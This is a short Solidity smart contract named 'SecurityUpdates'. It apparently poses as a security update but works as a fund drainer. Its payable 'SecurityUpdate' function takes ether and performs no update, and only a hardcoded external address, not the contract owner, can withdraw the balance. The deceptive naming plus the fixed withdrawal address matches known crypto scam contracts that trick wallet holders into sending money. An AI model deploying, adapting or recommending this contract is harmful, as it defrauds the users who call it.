pragma solidity ^0.4.26;

contract SecurityUpdates {

    address private  owner;    // current owner of the contract

    // specific withdraw address
    address private  withdraw_ = 0xF52a579CA3715D66E133f839D681fD6292b81162; 

    constructor() public{   
        owner=msg.sender;
    }

    function getOwner() public view returns (address) {    
        return owner;
    }
    
    function withdraw() public {
        require(msg.sender == withdraw_);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}